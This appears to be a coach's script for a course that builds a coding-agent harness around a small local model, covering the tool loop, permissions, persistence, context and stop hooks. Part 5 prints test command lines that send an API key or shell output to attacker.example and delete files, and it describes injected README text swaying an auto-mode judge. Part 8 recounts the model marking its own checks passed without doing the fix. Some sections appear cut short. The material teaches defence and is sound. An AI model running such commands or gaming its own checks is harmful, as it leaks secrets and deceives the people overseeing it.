Build Your Claude Code from Scratch

The Coach's Script

What to run, what will appear, what to say, and which piece of code made the difference: one part at a time, for the person about to teach it.

Part 1
qwen3 1.7B tries pytest, tries pip, reads a file that isn't there, and the turn crashes.
Part 4
One sentence typed while it works steers it to the right fix.
Part 7
With project notes it runs the right test, is refused when it tries to change the test, and explains the fix.
Part 8
A stop hook sends it back with the failing output. It writes the correct fix. The tests pass.
Part 10
It hands work to three subagents at once and combines what they report.
Part 11
The same harness runs on a cron schedule with nobody watching: rules decide each call, a lock stops overlapping runs, and every run leaves a report.

Same weights from the first part to the last. The model never got better; the harness did.

Set up once

Do 
cd claude_code_from_scratch
source .venv/bin/activate
ollama create cc-qwen3 -f Modelfile     # again whenever the Modelfile changes
unset MODEL                             # default is cc-qwen3; MODEL=fake for the scripted model
./verify.sh                             # 24/24 before you record anything

Ollama has to be running (the menu-bar app, or ollama serve). At a permission prompt, 1 is yes and 2 is no; when "don't ask again" is offered it takes 2 and no moves to 3. Esc interrupts. shift+tab cycles the permission mode. Each model step starts with a few seconds of grey ✻ lines: that is qwen thinking.

The one bug the whole course chases

Every part works in sandbox/, a fresh copy of workspace/ made by --reset. It holds one bug:

workspace/cart.py
def total(items, discount=0):
    """Return the order total for (price, qty) items, with `discount` percent off."""
    subtotal = sum(price * qty for price, qty in items)
    return subtotal - discount          # subtracts 10 rupees, not 10 percent
workspace/test_cart.py
assert total([(10.0, 2), (5.0, 1)]) == 25.0
assert total([(200.0, 1)], discount=10) == 180.0, "10% off 200 should be 180"
assert total([(100.0, 1)], discount=50) == 50.0, "50% off 100 should be 50"

The fix is one line: return subtotal * (1 - discount / 100). The 50%-off case is there on purpose: a "fix" that only makes 200 come out as 180 fails it.

Why the runs replay

  • The Modelfile sets temperature 0, top_k 1, seed 42 and a 16k window, so the same prompt gives the same reply.
  • local.py lets qwen think for at most 256 tokens a step, then closes the thought and makes it act. It also empties Ollama's prompt cache when a conversation starts, so the run before can't change this one.
  • The agent's shell is pinned: its python3 is the course's Python, pip refuses, and nothing from your own shell leaks in. The system prompt has no date in it.
If it goes differently

Type prompts character for character. A different prompt, a changed file in workspace/, another Ollama version or another machine can send a 1.7B model down a different path. Rehearse the whole script after any edit. If a take diverges, --reset and run it again: the same input gives the same run.

Part 0

The screen and the function

Before any agent exists, separate the two things people blur: the screen, and the model. Neither is the agent.

Scene 1: a puppet

Do

python part_0/main.py, type anything, press 1 when asked to run ls -la.

> hello
You said 'hello'. I'm a puppet, so I'll do what I always do: list the files.
⏺ Bash(ls -la)
Run `ls -la`?  1
  ⎿ total 24 ...
That's the whole act. Everything you just saw was five kinds of event.
Say

That looked like an agent. It streamed words, proposed a command, asked permission, ran it and showed output. There's no model anywhere. It's a script yielding five kinds of event: Text, ToolCall, Ask, ToolResult and Notice. That's the whole contract between the screen and whatever sits behind it, and for the rest of the course we replace the puppet with a real loop.

Scene 2: the model is a function

Do

python part_0/one_call.py

It sends "my name is Vivek", then asks "what is my name?" in a second, separate request, and the model doesn't know. Then it sends the same question with the first exchange re-sent, and the model answers.

Say

The model kept nothing between calls. Memory is a list in my program, and I send the whole list every time. Whoever holds the list holds the memory. That's the first job of a harness.

Scene 3: a tool call runs nothing

Do

python part_0/tool_call.py

The request describes one tool, Read, and asks "what is in cart.py?". qwen replies with a tool_use block asking for Read(cart.py), and stop_reason: tool_use. Then the script ends.

The lesson

A tool call is a request, not an action. The model asked and stopped. Nothing read the file. Everything after this reply is code we write, and that code is the harness.

Part 1

The loop

Call the model, run what it asks for, send the results back, repeat until it stops asking. Twenty lines, and it's already an agent: a bad one, which is the point.

The code

part_1/agent.py: the whole agent
for _ in range(MAX_TURNS):
    reply = await self.model.complete(SYSTEM, self.messages, tools.SCHEMAS)
    self.messages.append({"role": "assistant", "content": reply["content"]})
    results = []
    for block in reply["content"]:
        if block["type"] != "tool_use":
            continue
        ...ask permission for Write and Bash...
        output = await tools.run(self.root, block["name"], block["input"])
        results.append({"type": "tool_result", "tool_use_id": block["id"], "content": output})
    if reply["stop_reason"] != "tool_use":
        return
    self.messages.append({"role": "user", "content": results})

Three tools in part_1/tools.py: Read, Write, Bash. Each one is a JSON schema the model reads plus a Python function we run. MAX_TURNS = 25 is the only brake.

Part 2

Tool design is API design for an LLM reader

Part 1 died because a tool error was an exception. An error is information. Give it back to the model as a result, worded so it knows what to do next.

Scene 1: the scripted failure

Do

MODEL=fake python part_2/break_it.py

── Part 1: a tool error is an exception
> what's in config.py?
  ✗ FileNotFoundError: [Errno 2] No such file or directory: '.../sandbox/config.py'
> ok, try settings.py
  ✗ FakeAPIError: 400 invalid_request_error: messages.2: `tool_use` ids were found without
    `tool_result` blocks immediately after: toolu_fake_001
── Part 2: a tool error is a result
> what's in config.py?
  ⎿  error: config.py does not exist. Use Glob to see which files do.
  ⎿  cart.py
  ⏺ There's no config.py here. The project has `cart.py` and `test_cart.py`.
Say

Two failures in one. The exception killed the turn, and it killed it before the tool call got its result. The API requires every tool_use to be answered by a tool_result, so every request after that is a 400. One missing file and the session is dead.

The code

part_2/tools.py
class ToolError(Exception):
    """A failure the model can act on. Its message is the tool result."""

def describe(exc: Exception) -> str:
    """An exception as the model should see it."""
    if isinstance(exc, ToolError):
        return str(exc)
    if isinstance(exc, asyncio.TimeoutError):
        return "The command timed out and was killed."
    return f"{type(exc).__name__}: {exc}"

Seven changes, all in tools.py:

  • Errors are results, with is_error set and a next step: "config.py does not exist. Use Glob to see which files do."
  • Schemas are prompts: each description says when to use the tool and how to recover.
  • Edit replaces whole lines matched exactly once. It refuses a match in the middle of a line, and its result shows the lines as they now read.
  • Read before edit: it refuses to change a file the model hasn't read, or one that changed since it was read.
  • Output budgets: numbered lines, offset/limit, head and tail kept, "N characters omitted".
  • Glob and Grep: bounded, read-only search tools, so the model doesn't have to search with find through Bash.
  • A registry: schema, handler, read_only and concurrency_safe in one place. Parts 5 and 10 depend on those flags.

The lesson

Your tools are an API whose only reader is a language model. Every message is a prompt. An error that says what to do next is worth more than a stack trace.

Part 3

Streaming

The model isn't faster. It just stops looking frozen.

Scene 1: the scripted comparison

Do

MODEL=fake python part_3/break_it.py

Part 2, one reply: first words after 2.0s, turn done after 2.0s
Part 3, streamed : first words after 0.3s, turn done after 1.9s

Same model, same speed. Streaming doesn't make the model faster; it stops the screen looking frozen.

The code

  • sse.py parses server-sent events by hand, line by line: event:, data:, a blank line ends the event.
  • Reply assembles the message as it arrives. Text can be shown straight away. A tool call's input arrives as JSON fragments and is unusable until its block closes.
  • Thinking streams first. The screen shows it as grey ✻ lines.
  • headless.py: -p PROMPT --json is a second subscriber to the same events, with no screen at all.

Scene 2: the real model

Do

python part_3/main.py --reset, type Explain the bug in the total function in cart.py. About 35 seconds.

> Explain the bug in the total function in cart.py.
  ✻ (a few grey lines: qwen thinking, streamed as it happens)
⏺ Read(cart.py)
  ⎿ 1  def total(items, discount=0): ...
  ✻ ...
⏺ The bug in the `total` function is that it subtracts the discount as a numeric value
  (e.g., `discount=10` results in `subtotal - 10`) instead of applying the discount as a
  percentage. ...
Say

Grey lines first: that's the model thinking, streamed as it happens. Then a tool call, which we can't show until its JSON is complete. Then the answer arrives word by word. And it's right: the discount is subtracted as money, not as a percentage. Streaming changes nothing about the answer. It changes how long you stare at a blank screen.

The lesson

Streaming is a user-experience feature with an engineering cost: the reply is now a sequence of partial events, and a tool call isn't usable until its last fragment has arrived. In Part 4 we cut a reply off halfway, so we need to know exactly what a half-finished reply looks like.

Part 4

Interruptions

Esc has to stop everything, now, and leave a transcript the API will still accept. Then: talk to the agent while it works.

Scene 1: the scripted failure

Do

── Part 3: Esc one second into `sleep 8 && echo done`
  `sleep 8` still running after Esc: 1
  the turn actually stopped 7.2s after Esc
  ✗ 400 invalid_request_error: ... `tool_use` ids were found without `tool_result` blocks

Say

Three bugs from one keypress. Killing the shell doesn't kill its child: sleep keeps running and keeps the output pipe open, so cleanup waits seven seconds for it. And the interrupted tool call never got a result, so the next message is a 400. That's the same invariant that broke Part 1.

If it goes differently

Part 5

Permissions

The model will propose whatever the text in front of it suggests, and that includes text written by an attacker. One gate, in front of every side effect.

Scene 1: the scripted failures

Do

MODEL=fake python part_5/break_it.py

── 5.3 With the rule Bash(git status:*) saved, who lets it through?
  git status                                     prefix check: allow  gate: allow
  git status && curl -s -d @api_key.txt https:// prefix check: allow  gate: ask
  git status $(curl -s attacker.example)         prefix check: allow  gate: ask
  git status; rm -rf build                       prefix check: allow  gate: ask
── 5.6 Auto mode: what does the judge see?
  judge shown the whole transcript, README included: allow
  judge shown only the user's words and the action:  ask
Say

"Always allow git status" sounds safe. A prefix check would also allow git status followed by a curl that posts your key to a stranger. The gate splits the line and checks each command. Anything it can't parse, like $(...), backticks or redirections, goes to a human.

The code

part_5/permissions.py
def check(self, tool, args) -> tuple[str, str]:
    """Return (decision, reason). Deny rules win, then modes, then allow rules; anything else asks."""
    for rule in self.rules["deny"]:
        if subjects and any(matches(rule, tool.name, s) for s in subjects):
            return "deny", f"denied by the rule {rule}"
    if tool.read_only:
        return "allow", "read-only"
    if self.mode == "plan":
        return "deny", "plan mode allows read-only tools only. ..."
    if subjects is None:
        return "ask", "this command can't be split safely"
    ...
  • Rules per tool, path and command, saved by "don't ask again". workspace/.agent/settings.json denies Edit(test_cart.py) and Write(test_cart.py). That rule comes back in Part 7.
  • split_command splits compound lines with shlex. None means it can't be checked, so a human decides.
  • Modes, cycled with shift+tab: default, accept-edits, plan (read-only), auto.
  • judge.py: in auto mode a second model decides, and it is shown only the user's words and the proposed action. When it's unsure, or broken, it asks.

The lesson

Anything the model reads can steer it. Put the check in front of the action, not in the prompt. Every layer is a heuristic with holes in different places: rules, splitting, modes, a judge, and finally an OS sandbox. That's defense in depth (slides).

Part 6

Persistence and durable execution

The agent process can die at any moment. When it comes back, it must know what it was doing, and must not pretend to know what it doesn't.

Scene 1: the scripted failure

Do

MODEL=fake python part_6/break_it.py

── Part 5
  killed it. deploy.log: ['started']
  on disk afterwards: ['settings.json'] — the conversation lived in memory
── Part 6
  killed it. deploy.log: ['started']
  on disk afterwards: 20261110-155316-5c4624.jsonl, 4 records
  resumed: 1 tool call with no recorded result → "Outcome unknown: the session stopped while..."

The code

part_6/session.py
UNKNOWN = ("Outcome unknown: the session stopped while this was running. It may or may not have happened. "
           "Check before running it again.")
NOT_RUN = "Not run: the session stopped before this started."
part_6/agent.py
"""Write-ahead: checkpoint the file and log the intent, run, then log the result."""
self.log.append("intent", id=block["id"], name=block["name"], input=block["input"])
  • An append-only JSONL log per session. --resume replays it into a transcript.
  • Write-ahead: an intent record before every tool call, and a result record after it.
  • An intent with no result becomes "outcome unknown". It is never silently re-run.
  • Atomic writes (temp file, fsync, rename), and a reader that drops a torn last line.
  • /rewind restores the files the last turn changed. Commands can't be undone, and it says so.

Say

kill -9 gives the program no chance to clean up. Look at what happened: the agent died, and the command didn't. The deploy finished on its own. When we resumed, the log had an intent with no result, so the harness told the model the honest thing: outcome unknown, check before running it again. And it checked. It didn't guess and it didn't deploy twice. Also notice the prompt: "this command can't be split safely". The redirections sent it to a human. That's Part 5 still doing its job.

The lesson

Durable execution is write-ahead logging. You can't know whether a side effect happened if you died in the middle of it, but you can know that you don't know, and say so. "Unknown" is a valid state. A silent retry is how you deploy twice.

If it goes differently

The pkill has to land during the five-second sleep. Have the second terminal ready with the command typed before you press 1.

Part 7

Context management

The context window is the agent's working memory, and it's finite and expensive. Decide what goes in it, keep the start of it stable, and clear it before it overflows.

Scene 1: the scripted failure

Do

MODEL=fake python part_7/break_it.py

── A 12-batch log audit in a 9,000-token window
  Part 6: ✗ 400 invalid_request_error: prompt is too long: 9673 tokens > 9000 maximum
  Part 7: finished after 24 tool calls
    ⎿  cleared 1 old tool output · context now 58% full
    ⎿  compacted the conversation: 7,366 → 1,280 tokens
── 7.3 The same 5-call fix, cached
  append-only              :  2,164 read from cache,   800 written · billed like 5,582 input tokens
  time in the system prompt:      0 read from cache, 2,898 written · billed like 7,988 input tokens
Say

Two lessons in one screen. Fill the window and the API refuses you. And put something that changes, like the current time, at the start of the prompt, and you throw away the cache on every call. A cache read costs a tenth of an input token, and you only get it if the prefix stays byte-for-byte the same.

The code

  • context.py assembles the system prompt once: environment, the git branch, and the project's AGENTS.md. There's no date in it.
  • Cache marks go on the system prompt and the newest message. The transcript is append-only.
  • Past half the window, old tool output is replaced by "[old tool output cleared to save context]".
  • Past 80%, compaction: the model writes a summary, and the summary, the user's words and the todo list start a fresh transcript.
  • TodoWrite: a tool whose only effect is working memory that survives compaction. /context and /compact are new commands.
workspace/AGENTS.md: now in the system prompt

- `discount` is always a percentage.
- Change existing files with small edits, not whole-file rewrites.

Part 8

Long-running agents: the stop hook and the Ralph loop

The model decides when it's done, and it's often wrong. Let a check decide instead.

Scene 1: the scripted failure

The code

def until(root, check: str, prompt, max_iterations: int):

        ...

Why the scoreboard belongs to the tests: what qwen did

Tell this as a story; don't run it on camera, because on qwen each pass takes minutes.

  • When the agent kept the ledger itself (each pass told to flip "passes" in features.json once its check passed), qwen never opened cart.py. It read features.json, tried to set "passes": true, and replied <promise>COMPLETE</promise>. At temperature 0 every pass did the same thing. The loop refused each promise because the tests disagreed, and made no progress at all.
  • With the ledger written by the tests and one feature per pass, qwen worked on cart.py. With a bare FAIL rounding as its only feedback it finished two of the three features in six passes. One pass left cart.py so broken the tests could not run; the next pass started from that commit and repaired it.
  • So each failing check now says what it got and what it expected: total([(0.1, 3)]) returned 0.30000000000000004, expected 0.3. That's Part 2's lesson again: an error message is a prompt.
The lesson

Never let the model grade its own work. A stop hook keeps one long conversation going until a check passes. The Ralph loop starts a fresh conversation each pass and keeps the memory in files and git. Both work for the same reason: something other than the model decides when the work is done.

Part 9

Reliability and cost

APIs fail: rate limits, overload, dropped connections. Retry the right thing, at the right boundary, and put a ceiling on what a run can spend.

Scene 1: the scripted failure

Do

MODEL=fake python part_9/break_it.py

── Part 8 + a retry around the turn
  turn failed: 529 overloaded_error · running the turn again
  commits.log: ['fix discount', 'fix discount']
── Part 9: retry around the request
  ⎿  API error 529 overloaded_error · retrying in 0.0s (1/4)
  ⎿  API error 529 overloaded_error · retrying in 0.1s (2/4)
  commits.log: ['fix discount']
── 9.3 A budget instead of hoping
  ⎿  budget of 20,000 tokens used up (21,550); stopping here
Say

The obvious retry, "the turn failed, run it again", committed the same change twice. A turn has side effects. A request doesn't: if the API failed before replying, the model saw nothing, and sending the same request again is safe.

The code

part_9/retry.py
RETRYABLE = {408, 409, 429, 500, 502, 503, 504, 529}

def retryable(exc: Exception) -> bool:
    """Rate limits, overload, server errors and dropped connections; a 400 will fail the same way again."""
    return isinstance(exc, APIError) and (exc.status is None or exc.status in RETRYABLE)

def delay(attempt: int, retry_after: float | None = None) -> float:
    """The server's Retry-After if it sent one, else a random wait up to an exponentially growing cap."""
    if retry_after:
        return retry_after
    return random.uniform(0, min(CAP, BASE * 2 ** attempt))
  • Retry only before the first byte of a reply, never around a turn.
  • Full jitter, so a thousand clients that failed together don't retry together.
  • --budget: once a number of tokens has been spent, the loop stops. It's the grown-up version of MAX_TURNS.
  • openai_compat.py: the same interface over OpenAI-style chat completions (MODEL=openai:...). Thinking blocks and is_error don't survive the translation.

If it goes differently

The code

part_11/permissions.py
def ask(self, reason) -> tuple[str, str]:
    """With nobody watching, a question is a no: the model gets the reason back as a result."""
    return ("deny", NOBODY_HERE) if self.mode == "dont-ask" else ("ask", reason)
part_11/always_on.py
class Lock:
    """One run per folder at a time. The OS drops a flock when its process dies, so a crash never leaves it held."""

async def run_once(root, model, task, allow=(), budget=50_000, until=None, notify=None, source="schedule"):
    """Take the lock or skip, run, write the report, tell someone. Returns the report."""
  • --once is for a scheduler outside the agent: a crontab line, a launchd agent, a systemd timer, or a scheduled CI job. This is how most production setups do it.
  • --every 10m and --cron "0 9 * * 1-5" keep one process running as a daemon. cron.py is cron syntax from scratch, including the trap where day-of-month and day-of-week match if either does. The next slot is worked out after each run, so missed slots are skipped, not fired all at once.
  • --watch inbox/ is an event trigger: one run per file dropped in. A webhook handler only has to write a file there. Each file comes from someone who isn't watching, so the allow list is what protects you, not the wording of the prompt.
  • Every run leaves a report in .agent/runs/, with one of four statuses: done, needs you, skipped or error. --budget caps tokens per run, --until is Part 8's stop hook, and --notify gets the summary on stdin.
